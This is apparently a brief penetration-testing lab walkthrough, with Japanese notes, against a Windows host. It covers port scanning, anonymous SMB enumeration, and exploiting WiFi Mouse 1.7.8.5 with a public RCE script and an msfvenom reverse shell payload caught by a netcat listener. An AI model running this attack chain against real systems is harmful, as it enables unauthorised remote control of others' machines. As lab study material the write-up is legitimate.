```bash
nmap -p- 192.168.214.11 --min-rate=20000
- 135 RPC
- 445 SMB
- 1978 mouseserver
```

```bash
smbclient -L //192.168.214.10/ -N
- offsec

smbclient //192.168.214.10/ -N
cd Downloads
- MouseServer.exe
```

```bash
mouseserverをwebで調査
- WiFi Mouse 1.7.8.5 - Remote Code Execution                         | windows/remote/49601.py

searchsploit -m 49601
```

```bash
python3 -m http.server 80

nc -nlvp 4444

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.192 LPORT=4444 -f exe > reverse.exe

python2 49601.py 192.168.214.10 192.168.45.192 reverse.exe
- C:\Windows\system32>

```
